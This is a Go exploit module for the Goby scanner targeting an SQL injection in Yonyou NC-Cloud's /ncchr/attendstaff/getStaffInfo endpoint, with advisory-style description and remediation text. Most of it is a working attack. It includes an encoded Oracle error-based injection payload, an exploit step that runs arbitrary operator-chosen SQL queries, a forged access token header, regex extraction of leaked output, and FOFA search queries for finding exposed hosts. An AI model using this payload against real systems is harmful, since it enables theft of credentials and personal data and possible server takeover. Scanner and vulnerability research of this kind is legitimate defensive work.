package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC-Cloud /ncchr/attendstaff/getStaffInfo SQL Injection Vulnerability",
    "Description": "<p>Yonyou NC system is an integrated solution for managing various business processes of enterprises, covering finance, human resources, supply chain management, and more. This vulnerability exists in the /ncchr/attendstaff/getStaffInfo interface of Yonyou NC-Cloud, allowing attackers to construct malicious SQL statements to obtain sensitive information from the database (such as administrator passwords and user personal information), and potentially write malicious files to the server under high privileges to further gain server control.</p>",
    "Product": "Yonyou NC-Cloud",
    "Homepage": "http://yongyou.net.cn/products/nccloud.html",
    "DisclosureDate": "2024-12-17",
    "PostTime": "2024-12-18",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"html/downloadBroswer.html\" && body=\"platform/pub/welcome.do\"",
    "GobyQuery": "body=\"html/downloadBroswer.html\" && body=\"platform/pub/welcome.do\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, and potentially control the server under high privileges, leading to data leakage, system damage, and other serious consequences.</p>",
    "Recommendation": "<p>It is recommended to immediately fix the SQL injection vulnerability, strictly parameterize user inputs to avoid direct SQL statement concatenation. Additionally, upgrade Yonyou NC-Cloud to the latest version and strengthen access control to the interface.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/7vPRIqv8V8UxesXP1OhirQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1,SELECT * FROM v$version WHERE rownum = 1,SELECT USER FROM dual",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/ncchr/attendstaff/getStaffInfo?id=1%27%29+AND+1719%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%281719%3D1719%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+LDwR",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
                    "accessTokenNcc": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "qjjkq1qbkqq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/ncchr/attendstaff/getStaffInfo?id=1%27%29+AND+1719%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28{{{payload_encode}}}%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+LDwR",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
                    "accessTokenNcc": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ORA-31011",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|qjjjq([^'][\\s\\S]*?)qbkqq",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "用友NC-Cloud /ncchr/attendstaff/getStaffInfo SQL 注入漏洞",
            "Product": "用友NC-Cloud",
            "Description": "<p>用友NC系统是一种集成管理企业各项业务流程的信息化解决方案，涵盖财务、人力资源、供应链管理等多个方面。该漏洞存在于用友NC-Cloud的/ncchr/attendstaff/getStaffInfo接口中，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息（如管理员密码、用户个人信息），甚至可能在高权限情况下向服务器写入恶意文件，进一步获取服务器权限。</p>",
            "Recommendation": "<p>建议立即修复SQL注入漏洞，对用户输入进行严格的参数化处理，避免直接拼接SQL语句。同时，建议升级用友NC-Cloud到最新版本，并加强对接口的访问控制。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取数据库中的敏感信息，甚至可能在高权限情况下控制服务器，导致数据泄露、系统破坏等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Yonyou NC-Cloud /ncchr/attendstaff/getStaffInfo SQL Injection Vulnerability",
            "Product": "Yonyou NC-Cloud",
            "Description": "<p>Yonyou NC system is an integrated solution for managing various business processes of enterprises, covering finance, human resources, supply chain management, and more. This vulnerability exists in the /ncchr/attendstaff/getStaffInfo interface of Yonyou NC-Cloud, allowing attackers to construct malicious SQL statements to obtain sensitive information from the database (such as administrator passwords and user personal information), and potentially write malicious files to the server under high privileges to further gain server control.</p>",
            "Recommendation": "<p>It is recommended to immediately fix the SQL injection vulnerability, strictly parameterize user inputs to avoid direct SQL statement concatenation. Additionally, upgrade Yonyou NC-Cloud to the latest version and strengthen access control to the interface.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, and potentially control the server under high privileges, leading to data leakage, system damage, and other serious consequences.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|url_encode|{{{payload}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/ncchr/attendstaff/getStaffInfo"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
